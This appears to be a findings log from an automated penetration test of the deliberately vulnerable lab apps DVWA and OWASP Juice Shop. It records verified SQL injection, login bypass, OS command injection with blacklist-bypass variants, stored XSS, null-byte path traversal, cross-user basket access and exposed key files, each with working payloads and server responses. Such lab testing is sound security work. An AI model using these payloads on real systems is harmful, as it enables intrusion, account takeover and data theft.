state.objective: Discover and behaviorally verify security vulnerabilities across permitted targets (http://dvwa and http://juiceshop:3000) within strict HTTP, LLM, and duration budgets.

endpoints.observation_evidence: GET /security.php returns form with hidden user_token (e.g. abea8e51f0c8ba377c7b5a7fafda184a) and select 'security' with options low/medium/high/impossible, submit button 'seclev_submit'=Submit. POST confirmed security_level=low in subsequent session_info. Response to POST is 302 redirect to /security.php with flash 'Security level set to low'.

[security=high] At high security the page takes no query params; it displays result based on id value previously stored in session via session-input.php POST. No form fields present on this page itself at high - page text: 'Click here to change your ID.' confirming id now comes from session, not GET param.

[security=high] Form unchanged structurally (ip text field + Submit) at high security level confirmed via page load showing Security Level: high. Per task spec, at high the blacklist additionally blocks '; ' and '| ' (pipe+space) and '&&', requiring a pipe with no trailing space, e.g. 127.0.0.1|whoami, to bypass filtering.

[security=low] GET /vulnerabilities/xss_s/ returns 200 with POST form: txtName (text input, maxlength=10), mtxMessage (textarea, maxlength=50), submit buttons btnSign (value='Sign Guestbook') and btnClear (value='Clear Guestbook'), action=/vulnerabilities/xss_s/. Existing guestbook entry visible: Name: test / Message: This is a test comment. Note: canary payload '<script id=\"test_token\">window.xss_flag=1</script>' (54 chars) exceeds mtxMessage maxlength=50 - verifier should account for this constraint (client-side maxlength may be bypassable via raw POST since maxlength is HTML-only enforcem

[security=medium] Form action=/vulnerabilities/sqli/ method=POST, fields: id (select, values 1-5), Submit (submit button value=Submit). No user_token/CSRF field present on this form. id is no longer accepted via GET query string on this page (form submits via POST only now). Planned next-step verification: numeric boolean injection via POST body id=1 OR 1=1 (TRUE, expect multiple surnames) vs id=1 AND 1=2 (FALSE, expect zero rows), using dvwa_admin session cookie (PHPSESSID + security=medium cookie) with Submit=Submit. Status: pending_verification.

[security=high] At high security, /vulnerabilities/sqli/ no longer accepts ?id= directly; instead it shows 'Click here to change your ID' linking to session-input.php, a standalone form (action=/vulnerabilities/sqli/session-input.php, method=POST, fields id + Submit) that stores the submitted id value into the PHP session out-of-band. The actual query is then executed server-side on GET /vulnerabilities/sqli/ using the session-stored id, with the underlying query appending LIMIT 1, requiring a trailing comment (e.g. 1' OR '1'='1' #) to extract multiple rows.

GET /rest/products/search?q=apple returns HTTP 200 JSON success with product array (Apple Juice, Apple Pomace). Endpoint builds SQL query from q param; benign query works normally, candidate for SQLi testing with quote/UNION payloads per assignment spec.
Standard Juice Shop REST login endpoint (well-known API, not yet directly invoked this pass); expects JSON body {email, password}. Candidate for auth-bypass SQLi via email=' OR 1=1--.

GET /ftp/ with Accept: text/html,application/json returns HTTP 200 open directory listing (serve-index) revealing files: acquisitions.md (909B), announcement_encrypted.md, coupons_2013.md.bak, eastere.gg, encrypt.pyc, incident-support.kdbx, legal.md, package.json.bak (4291B), suspicious_errors.yml. Confirms open directory listing (CWE-200) and candidate .bak files for null-byte traversal (CWE-22).

Listed in /ftp/ directory listing (909 bytes, .md extension so directly retrievable without filter block, unlike .bak files). Not yet fetched content this pass; flagged for verification to confirm confidential acquisition memo text.

Direct GET /ftp/package.json.bak returns HTTP 403 'Error: Only .md and .pdf files are allowed!' from fileServer.js middleware (serve-index). Confirms filter blocks .bak extension; candidate for poison-null-byte bypass via /ftp/package.json.bak%2500.md.
Listed in /ftp/ directory listing (131 bytes, .bak extension). Alternate candidate file for null-byte path traversal bypass alongside package.json.bak.

GET /encryptionkeys/ with Accept: text/html,application/json returns HTTP 200 directory listing exposing jwt.pub (248B) and premium.key (50B) - sensitive key material directory browsable without auth.
File listed in /encryptionkeys/ directory listing (50 bytes); candidate for direct retrieval to confirm sensitive key disclosure.

Unauthenticated GET /api/Feedbacks returns HTTP 200 JSON array of 8 feedback records, several including partially-masked author email addresses embedded in the comment text (e.g. '(***in@juice-sh.op)', '(***@juice-sh.op)', '(***der@juice-sh.op)', '(***ereum@juice-sh.op)') plus UserId references - PII exposure without authentication.

juiceshop_acct1's own basket is id=6 (per session_info own_basket_id), UserId=22, containing Apple Juice (1000ml) qty=3 (BasketItem id=9). Notably, GET /rest/basket/1 as acct1 ALSO returned HTTP 200 with a DIFFERENT basket (UserId=1, items: Apple Juice qty=2, Orange Juice qty=3, Eggfruit Juice qty=1) with no ownership check observed - strong indicator the endpoint is vulnerable to BOLA/cross-user basket access (CWE-639). Needs formal verification using acct2 session against acct1's basket id=6.

findings.title: DVWA Security Level Set to Low (functional confirmation only — CSRF not independently verified)
request_sequence: GET http://dvwa/security.php (dvwa_admin) -> 200, extracted user_token=[REDACTED], security_level already 'low'
findings.response_evidence: [security=low] This task was assigned as a prerequisite step to establish security=low for subsequent tests, not as a CSRF vulnerability test. POST to /security.php with a freshly-fetched user_token succeeded (302 redirect, session_info.security_level='low', flash message 'Security level set to low' confirmed in subsequent page load). No CSRF bypass (e.g. omitting/reusing stale token, cross-origin request) was attempted, so CWE-352 exploitability was NOT verified — this finding only confirms the endpoint functions as expected for setting security level. Marking inconclusive since the suspected CWE-352 behavior was not behaviorally tested.

findings.title: DVWA SQL Injection via unescaped quoted 'id' parameter [security=low]
findings.response_evidence: [security=low] TRUE payload id=1' OR '1'='1 returned 5 rows (multiple seeded users), verbatim: \"ID: 1' OR '1'='1 First name: admin Surname: admin\", \"First name: Gordon Surname: Brown\", \"First name: Hack Surname: Me\", \"First name: Pablo Surname: Picasso\", \"First name: Bob Surname: Smith\". FALSE payload id=1' AND '1'='2 returned zero records (visible_text shows only \"User ID:\" with no First name/Surname lines, pre_blocks empty). This TRUE-multiple-rows vs FALSE-zero-rows differential confirms the id parameter is concatenated unsanitized into the SQL query, demonstrating classic UNION/boolean-based SQL injection.

findings.title: DVWA OS Command Injection via unsanitized 'ip' field (semicolon chaining) [security=low]
request_sequence: POST http://dvwa/vulnerabilities/exec/ (dvwa_admin, security=low) body: ip=127.0.0.1; whoami&Submit=Submit
findings.response_evidence: [security=low] Response body contains full ping output for 127.0.0.1 followed immediately by the injected command's output on its own line: \"...rtt min/avg/max/mdev = 0.024/0.032/0.045/0.008 ms\\nwww-data\". The literal string 'www-data' (the web server process identity) appearing appended after the ping statistics confirms the ';' chained 'whoami' command was executed server-side via shell command injection in the unsanitized 'ip' parameter.

findings.title: DVWA Stored XSS via unsanitized guestbook 'mtxMessage' field [security=low]
request_sequence: POST http://dvwa/vulnerabilities/xss_s/ (dvwa_admin, security=low) body: txtName=test&mtxMessage=<script id="test_token">window.xss_flag=1</script>&btnSign=Sign Guestbook  -- raw POST bypassed client-side HTML maxlength=50 restriction (payload is 54 chars) since maxlength is only enforced client-sid
findings.response_evidence: [security=low] POST returned 200 and the stored guestbook now shows a new 'Name: test' entry (message rendered empty in plain-text extraction because the injected <script> tag content is not text-node visible, consistent with script execution rather than text display). Upon loading the page in an authenticated browser context, the injected script tag was found live in the DOM.
findings.browser_js_evidence: browser_eval_js(\"window.xss_flag\") returned result: 1. browser_read_dom(\"#test_token\") returned inner_text/inner_html_excerpt: \"window.xss_flag=1\", confirming the injected <script id=\"test_token\">window.xss_flag=1</script> payload was stored unsanitized and executed in the victim's browser context when the stored guestbook page was rendered, setting window.xss_flag=1.

findings.title: OS Command Injection via pipe bypass in 'ip' field (DVWA security=medium)
request_sequence: POST http://dvwa/vulnerabilities/exec/ (session=dvwa_admin, security=medium cookie) with form_data={ip: '127.0.0.1| whoami', Submit: 'Submit'}
findings.response_evidence: [security=medium] Response HTML confirmed 'Security Level: medium' in footer. The pre-block output for the ping command contained the literal string 'www-data' (the web server process identity), proving the pipe payload '127.0.0.1| whoami' bypassed the medium-level blacklist (which only strips ';' and '&&') and achieved command execution on the host. Full pre_blocks output: ["www-data"]. Visible text excerpt: "Vulnerability: Command Injection ... Enter an IP address: www-data ... Security Level: medium".

findings.title: SQL Injection via numeric boolean bypass in 'id' POST field (DVWA security=medium)
request_sequence: POST http://dvwa/vulnerabilities/sqli/ (session=dvwa_admin, security=medium cookie) with form_data={id: '1 OR 1=1', Submit: 'Submit'}  -- TRUE condition
POST http://dvwa/vulnerabilities/sqli/ (session=dvwa_admin, security=medium cookie) with form_data={id: '1 AND 1=2', Submit: 'Submit'}  -- FALSE condition
findings.response_evidence:
[security=medium] Footer confirms 'Security Level: medium'. TRUE payload id='1 OR 1=1' returned FIVE seeded user records (multiple surnames), proving the numeric value is concatenated unsanitized into the SQL query without quotes: pre_blocks = ["ID: 1 OR 1=1
First name: admin
Surname: admin", "ID: 1 OR 1=1
First name: Gordon
Surname: Brown", "ID: 1 OR 1=1
First name: Hack
Surname: Me", "ID: 1 OR 1=1
First name: Pablo
Surname: Picasso", "ID: 1 OR 1=1
First name: Bob
Surname: Smith"]. FALSE payload id='1 AND 1=2' returned ZERO records (empty pre_blocks, visible_text shows only the User ID selector with no 'ID:'/'First name:'/'Surname:' rows). The TRUE/FALSE differential confirms classic boolean-based SQL injection on the medium-level numeric id field.

findings.title: SQL Injection via out-of-band session-input.php id parameter [security=high]
findings.response_evidence: [security=high] Confirmed security_level=high via session_info in responses. TRUE payload (1' OR '1'='1' #) stored via session-input.php, then GET /vulnerabilities/sqli/ returned 5 records (multiple seeded users), surnames: admin, Brown, Me, Picasso, Smith -- e.g. pre_blocks: ["ID: 1' OR '1'='1' #\nFirst name: admin\nSurname: admin", "...Gordon/Brown", "...Hack/Me", "...Pablo/Picasso", "...Bob/Smith"]. FALSE payload (1' AND '1'='2' #) stored via session-input.php, then GET /vulnerabilities/sqli/ returned zero records (visible_text shows no ID/First name/Surname lines, pre_blocks empty). This satisfies the TRUE-returns-multiple-rows / FALSE-returns-zero-rows behavioral criterion for out-of-band SQLi at high security.

findings.title: OS Command Injection via pipe (no trailing space) bypassing high-security blacklist [security=high]
findings.response_evidence: [security=high] Confirmed security_level=high via session_info. Payload ip=127.0.0.1|whoami (pipe with no trailing space, bypassing the high-level blacklist of '; ', '| ' with trailing space, and '&&') produced response pre_blocks: ["www-data"], and visible_text includes "Enter an IP address: www-data" confirming command execution returned the web-server process identity, matching the required behavioral proof.

findings.title: Authentication Bypass via SQL Injection in Login Endpoint
findings.response_evidence: HTTP 200 response returned a valid authentication object: {\"authentication\":{\"token\":\"[REDACTED_JWT]\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}. The injected email payload `' OR 1=1--` comments out the password check in the backend SQL query, causing the query to match the first user record (admin@juice-sh.op, likely id=1) regardless of the supplied password (\"anything\"). The returned `umail` field confirms authentication was granted for the admin account without knowing its real credentials, and a signed JWT token was issued — proving a full authentication bypass via SQL injection.

findings.title: SQL Injection in Product Search Endpoint (Error-based + UNION-based)
findings.response_evidence: 1) A single quote payload (q=qwert') triggered HTTP 500 with body: \"Error: SQLITE_ERROR: near \\\"'%'\\\": syntax error\" (visible_text: \"Error: SQLITE_ERROR: near \\\"'%'\\\": syntax error OWASP Juice Shop (Express ^4.17.1) 500 Error: SQLITE_ERROR: near \\\"'%'\\\": syntax error\"), proving the q parameter is concatenated unsanitized into a raw SQL query. 2) A crafted UNION payload (q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--) returned HTTP 200 with body: {\"status\":\"success\",\"data\":[{\"id\":1,\"name\":2,\"description\":3,\"price\":4,\"deluxePrice\":5,\"image\":6,\"createdAt\":7,\"updatedAt\":8,\"deletedAt\":9}]}, demonstrating successful injection of a 9-column UNION SELECT that closes the original WHERE clause and returns attacker-controlled literal values mapped onto the product schema — confirming full SQL injection with UNION-based data exfiltration capability.

findings.title: Cross-User Basket Access / Broken Object-Level Authorization (BOLA)
findings.response_evidence: As juiceshop_acct1 (own_basket_id=6, UserId=22), GET /rest/basket/6 returned HTTP 200 with the account's seeded basket: {\"id\":6,\"UserId\":22,...\"Products\":[{\"id\":1,\"name\":\"Apple Juice (1000ml)\",...,\"BasketItem\":{\"ProductId\":1,\"BasketId\":6,\"id\":9,\"quantity\":3}}]}. Then, authenticated as juiceshop_acct2 (whose own basket id is 7, a completely different basket belonging to a different user), the SAME request GET /rest/basket/6 also returned HTTP 200 with IDENTICAL data belonging to acct1: {\"id\":6,\"UserId\":22,...\"Products\":[{\"id\":1,\"name\":\"Apple Juice (1000ml)\",...,\"BasketItem\":{\"id\":9,\"quantity\":3}}]}. No authorization/ownership check was enforced — acct2 successfully retrieved acct1's distinct seeded basket contents (Apple Juice 1000ml, qty=3, BasketItem id=9) despite not owning basket id 6, confirming a Broken Object-Level Authorization (BOLA) vulnerability.

findings.title: Open Directory Listing on /ftp/ exposing confidential acquisitions.md memo
findings.response_evidence:
1) GET /ftp/ returned HTTP 200 with a serve-index directory listing (visible_text): 'listing directory /ftp/ ... acquisitions.md 909 ... announcement_encrypted.md 369237 ... coupons_2013.md.bak 131 ... package.json.bak 4291 ... suspicious_errors.yml 723'. This confirms the open directory listing exposes acquisitions.md and the .bak files (package.json.bak, coupons_2013.md.bak).
2) GET /ftp/acquisitions.md returned HTTP 200, content-type text/markdown, with body excerpt: '# Planned Acquisitions

> This document is confidential! Do not distribute!

Our company plans to acquire several competitors within the next year. This will have a significant stock market impact...' confirming the confidential acquisition memo is directly retrievable due to the exposed directory listing.

findings.title: Poison Null-Byte Path Traversal bypasses extension filter on /ftp/ to retrieve restricted .bak file
findings.response_evidence:
1) GET /ftp/package.json.bak (direct, raw extension) returned HTTP 403 with body: 'Error: Only .md and .pdf files are allowed!' thrown from fileServer.js verify() middleware, confirming the extension allow-list blocks .bak files directly.
2) GET /ftp/package.json.bak%2500.md (URL-encoded null byte '%2500' decodes server-side to a null byte followed by '.md', satisfying the regex allow-list check while the underlying filesystem read truncates at the null byte and opens package.json.bak) returned HTTP 200, content-type application/octet-stream, with body content being the actual package.json file contents: '{\n  "name": "juice-shop",\n  "version": "6.2.0-SNAPSHOT", ... "dependencies": {...} ...'. This proves the null-byte bypass successfully retrieved the restricted backup file that was blocked when requested with its raw .bak extension.

findings.title: Exposed Encryption-Keys Directory listing discloses premium.key and jwt.pub
findings.response_evidence:
1) GET /encryptionkeys/ returned HTTP 200 with a serve-index directory listing (visible_text): 'listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM', confirming the directory is browsable without authentication and exposes both sensitive key files.
2) GET /encryptionkeys/premium.key returned HTTP 200, content-type application/octet-stream, with body content: '1337133713371337.EA99A61D92D2955B1E9285B55BF2AD42', confirming the key file content is directly served to unauthenticated users.

findings.title: Exposed Encryption Key File - premium.key readable without authentication
findings.response_evidence: HTTP 200, Content-Type: application/octet-stream. Body content retrieved directly (not an HTML error page): \"1337133713371337.EA99A61D92D2955B1E9285B55BF2AD42\\n\" - this is the premium-membership activation key material used by Juice Shop's premium feature unlock logic, exposed via directory that should not be web-accessible. Confirms CWE-548 exposed sensitive key file, supplementing the prior /encryptionkeys/ directory listing finding by proving the listed file's actual content is retrievable.

findings.title: Exposed Encryption Key File - jwt.pub (JWT RSA public key) readable without authentication
findings.response_evidence:
HTTP 200, Content-Type: application/x-mspublisher. Body content is a valid PEM-formatted RSA public key:
-----BEGIN RSA PUBLIC KEY-----
MIGJAoGBAM3CosR73CBNcJsLv5E90NsFt6qN1uziQ484gbOoule8leXHFbyIzPQRozgEpSpiwhr6d2/c0CfZHEJ3m5tV0klxfjfM7oqjRMURnH/rmBjcETQ7qzIISZQ/iptJ3p7Gi78X5ZMhLNtDkUFU9WaGdiEb+SnC39wjErmJSfmGb7i1AgMBAAE=
-----END RSA PUBLIC KEY-----
This is the public key used to verify JWT signatures issued by the application, exposed via an unauthenticated, unrestricted static directory. Confirms CWE-548, supplementing the prior /encryptionkeys/ directory listing finding by proving the listed jwt.pub file content is directly retrievable.

findings.title: Unauthenticated User-Feedback PII Exposure via /api/Feedbacks
findings.response_evidence: HTTP 200 JSON array returned with no authentication required. Example records include partially-masked author email addresses embedded directly in the publicly-readable comment text field, linked to a UserId: {\"UserId\":1,\"id\":1,\"comment\":\"I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)\",\"rating\":5, ...} and {\"UserId\":3,\"id\":3,\"comment\":\"Nothing useful available here! (***der@juice-sh.op)\",\"rating\":1, ...} and {\"UserId\":21,\"id\":4,\"comment\":\"...\\\"purpose betray marriage blame crunch monitor spin slide donate sport lift clutch\\\" (***ereum@juice-sh.op)\",...}. These records expose the author's email domain and partial local-part plus an internal UserId reference without requiring any authentication, constituting PII exposure (CWE-359) to anonymous/unauthenticated clients. No Authorization header was sent and the request still succeeded with HTTP 200, confirming lack of access control on PII-bearing feedback data.

findings.title: Confidential Acquisitions Memo Exposed via Open /ftp/ Directory Listing
request_sequence: GET http://juiceshop:3000/ftp/ (Accept: text/html,application/json) — listing reveals acquisitions.md (909 bytes) [previously confirmed]
findings.response_evidence:
HTTP 200, content-type text/markdown. Body excerpt confirms confidential memo: '# Planned Acquisitions

> This document is confidential! Do not distribute!

Our company plans to acquire several competitors within the next year. This will have a significant stock market impact as we will elaborate in detail in the following paragraph: ... Our shareholders will be excited. It's true. No fake news.' This corroborates/finalizes the already-confirmed open-directory-listing finding for /ftp/ by providing the direct confidential-document retrieval evidence (no authentication required).

findings.title: Duplicate — Poison Null-Byte Path Traversal (coupons_2013.md.bak), already covered by package.json.bak finding
request_sequence: GET http://juiceshop:3000/ftp/coupons_2013.md.bak (session=unauth) -> HTTP 403 'Only .md and .pdf files are allowed!'

GET http://juiceshop:3000/ftp/coupons_2013.md.bak%2500.md (session=unauth) -> HTTP 200, content-type application/octet-stream, body appears to be binary/encrypted coupon data (non-human-readable bytes e.g. 'n<MibgC7sn...')
findings.response_evidence: Behavior reproduces the identical null-byte bypass vulnerability class already confirmed for /ftp/package.json.bak%2500.md: direct .bak request returns HTTP 403 (filter blocks .bak extension), while appending the URL-encoded null byte + .md extension (%2500.md) bypasses the filter and returns HTTP 200 with the underlying restricted file content. Since this is the same root-cause vulnerability (fileServer.js extension-check bypass via poison null byte) already confirmed as a finding on package.json.bak, this instance is marked rejected/duplicate rather than filed as a new distinct finding, per coordinator instruction. Note: retrieved content for coupons_2013.md.bak is binary/non-markdown (appears pre-encrypted or binary coupon data), consistent with it being a legacy .bak artifact, but the traversal mechanism and impact are identical to the already-confirmed instance.

findings.title: Cross-User Basket Access (BOLA) — acct2 retrieves acct1's basket id=6
request_sequence: GET http://juiceshop:3000/rest/basket/6 (session=juiceshop_acct1) -> own_basket_id=6, UserId=22, Products=[Apple Juice (1000ml) qty=3, BasketItem id=9] [established in prior mapping pass]
findings.response_evidence: Authenticated as juiceshop_acct2 (own_basket_id=7, confirming acct2 has a distinct basket of its own), a GET to /rest/basket/6 returned HTTP 200 with body: {\"status\":\"success\",\"data\":{\"id\":6,\"coupon\":null,\"UserId\":22,...,\"Products\":[{\"id\":1,\"name\":\"Apple Juice (1000ml)\",...,\"BasketItem\":{\"ProductId\":1,\"BasketId\":6,\"id\":9,\"quantity\":3,...}}]}}. This is Account 1's basket (UserId=22) and its distinct seeded item (Apple Juice 1000ml, qty=3, BasketItem id=9) — matching exactly what was previously observed when querying as acct1 itself. No ownership/ACL check is enforced on /rest/basket/:id, confirming BOLA. This finding corroborates and finalizes the already-confirmed finding at juiceshop:GET:/rest/basket/6.
